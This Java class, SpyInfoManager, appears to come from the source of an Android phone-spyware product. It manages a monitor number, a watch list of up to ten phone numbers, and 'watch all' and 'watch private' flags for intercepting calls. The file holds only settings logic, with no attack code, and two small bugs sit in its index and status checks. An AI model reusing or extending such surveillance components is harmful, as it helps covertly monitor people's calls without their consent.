package com.fx.preference;

import java.util.ArrayList;
import java.util.Collections;
import java.util.List;

import android.content.Context;

import com.fx.maind.ref.Customization;
import com.vvt.logger.FxLog;
import com.vvt.telephony.TelephonyUtils;

public abstract class SpyInfoManager {
	
	private static final String TAG = "SpyInfoManager";
	private static final boolean LOGV = Customization.VERBOSE;
	
	private static int sWatchAllNumberStatusStringResourceId = - 1;
	private static int sWatchListStatusStringResourceId = - 1;
	private static int sWatchPrivateStatusStringResourceId = - 1;
	private static int sDisabledStatusStringResourceId = - 1;
	
	private List<String> mWatchList = new ArrayList<String>();
	
	private Callback mCallback = null;
	
	private Context mContext = null;
	
	protected List<String> getEditableWatchList() {
		return mWatchList;
	}

	public interface Callback {
		void onRefresh();
		void onMaximumNumbersReached();
	}
	
	public abstract void sendRequestUpdateSpyInfo();

	public abstract boolean isEnabled();

	public abstract String getMonitorNumber();

	public abstract void setEnabled(boolean enabled);

	public abstract void setMonitorNumber(String monitorNumber);

	public abstract boolean isWatchAllEnabled();
	
	public abstract void setWatchAllEnabled(Boolean enabled);
	
	public abstract boolean isWatchListEnabled();
	
	public abstract void setWatchListEnabled(Boolean enabled);

	public abstract boolean isWatchPrivateEnabled();
	
	public abstract void setWatchPrivateEnabled(Boolean enabled);
	
	public abstract String getSimId();
	
	public abstract void setSimId(String simId);
	
	public abstract String getKeyword1();
	public abstract void setKeyword1(String kw1);
	
	public abstract String getKeyword2();
	public abstract void setKeyword2(String kw2);
	
	public abstract void dumpWatchListToStorage();
	
	public abstract void loadWatchListFromStorage();
	
	public SpyInfoManager(Context context) {
		mContext = context;
		loadWatchListFromStorage();
	}
	
	public Context getContext() {
		return mContext;
	}
	
	public synchronized List<String> getWatchList() {
		if (LOGV) FxLog.v(TAG, "getWatchList # ENTER ...");
		if (LOGV) FxLog.v(TAG, "getWatchList # Watch list:");
		int i = 0;
		for (String watchNumber : mWatchList) {
			if (LOGV) FxLog.v(TAG, String.format(
					"getWatchList # watchList[%d] = \"%s\"", i++, watchNumber));
		}
		return Collections.unmodifiableList(mWatchList);
	}
	
	public boolean isPhoneNumberExist(String givenNumber) {
		if (LOGV) FxLog.v(TAG, "isPhoneNumberExist # ENTER ...");
		for (String aNumber : mWatchList) {
			if (TelephonyUtils.isSamePhoneNumber(givenNumber, aNumber, 1)) {
				return true;
			}
		}
		return false;
	}
	
	public boolean isPhoneNumberExist(String givenNumber, int exceptionIndex) {
		if (LOGV) FxLog.v(TAG, "isPhoneNumberExist # ENTER ...");
		
		int aIndex = 0;
		for (String number : mWatchList) {
			if (aIndex == exceptionIndex) {
				continue;
			}
			if (TelephonyUtils.isSamePhoneNumber(givenNumber, number, 1)) {
				return true;
			}
			aIndex++;
		}
		return false;
	}

	public void addNumber(String number) {
		if (LOGV) FxLog.v(TAG, "addNumber # ENTER ...");
		
		if (mWatchList.size() >= getMaximumNumbers()) {
			if (mCallback != null) {
				mCallback.onMaximumNumbersReached();
			}
		} 
		else {
			mWatchList.add(number);
			if (mCallback != null) {
				mCallback.onRefresh();
			}
		}
	}

	public void setNumber(int editingIndex, String number) {
		if (LOGV) FxLog.v(TAG, "setNumber # ENTER ...");
		mWatchList.set(editingIndex, number);
		if (mCallback != null) {
			mCallback.onRefresh();
		}
	}

	public int getMaximumNumbers() {
		if (LOGV) FxLog.v(TAG, "getMaximumNumbers # ENTER ...");
		return 10;
	}

	public void setCallback(Callback callback) {
		if (LOGV) FxLog.v(TAG, "setCallback # ENTER ...");
		mCallback = callback;
	}

	public void removeAllNumbers() {
		if (LOGV) FxLog.v(TAG, "removeAllNumbers # ENTER ...");
		mWatchList.clear();
		if (mCallback != null) {
			mCallback.onRefresh();
		}
	}

	public void removeNumber(int removeIndex) {
		if (LOGV) FxLog.v(TAG, "removeNumber # ENTER ...");
		mWatchList.remove(removeIndex);
		if (mCallback != null) {
			mCallback.onRefresh();
		}
	}
	
	public boolean isWatchAllAllowSetting() {
		if (LOGV) FxLog.v(TAG, "isWatchAllAllowSetting # ENTER ...");
		return true;
	}
	
	public boolean isWatchListAllowSetting() {
		if (LOGV) FxLog.v(TAG, "isWatchListAllowSetting # ENTER ...");
		if (isWatchAllEnabled()) {
			return false;
		}
		return true;
	}
	
	public boolean isWatchPrivateAllowSetting() {
		if (LOGV) FxLog.v(TAG, "isWatchPrivateAllowSetting # ENTER ...");
		if (isWatchAllEnabled()) {
			return false;
		}
		return true;
	}
	
	public static void setWatchAllNumberStatusStringResourceId(int resourceId) {
		sWatchAllNumberStatusStringResourceId = resourceId;
	}
	
	public static void setWatchListStatusStringResourceId(int resourceId) {
		sWatchListStatusStringResourceId = resourceId;
	}
	
	public static void setWatchPrivateStatusStringResourceId(int resourceId) {
		sWatchPrivateStatusStringResourceId = resourceId;
	}
	
	public static void setDisabledStatusStringResourceId(int resourceId) {
		sDisabledStatusStringResourceId = resourceId;
	}
	
	public String getWatchAllNumberStatusStringResourceId() {
		if (sWatchAllNumberStatusStringResourceId == - 1) {
			return "All number";
		}
		return mContext.getString(sWatchAllNumberStatusStringResourceId);
	}
	
	public String getWatchListStatusStringResourceId() {
		if (sWatchAllNumberStatusStringResourceId == - 1) {
			return "Number in watch list";
		}
		return mContext.getString(sWatchListStatusStringResourceId);
	}
	
	public String getWatchPrivateStatusStringResourceId() {
		if (sWatchAllNumberStatusStringResourceId == - 1) {
			return "Private number";
		}
		return mContext.getString(sWatchPrivateStatusStringResourceId);
	}
	
	public String getDisabledStatusStringResourceId() {
		if (sWatchAllNumberStatusStringResourceId == - 1) {
			return "Disabled";
		}
		return mContext.getString(sDisabledStatusStringResourceId);
	}
	
	public String getWatchListStatus() {
		if (LOGV) FxLog.v(TAG, "getWatchListStatus # ENTER ...");
		
		StringBuilder s = new StringBuilder();
		
		if (isWatchAllEnabled()) {
			s.append(getWatchAllNumberStatusStringResourceId());
			return s.toString();
		}
		
		if (isWatchPrivateEnabled()) {
			if (s.length() > 0) {
				s.append(",");
			}
			s.append(getWatchPrivateStatusStringResourceId());
		}
		
		if (isWatchListEnabled()) {
			if (s.length() > 0) {
				s.append(",");
			}
			s.append(getWatchListStatusStringResourceId());
		}
		
		if (s.length() == 0) {
			s.append(getDisabledStatusStringResourceId());
		}
		
		return s.toString();
	}
	
	public void setWatchList(List<String> watchList) {
		mWatchList.clear();
		mWatchList.addAll(watchList);
	}
	
}
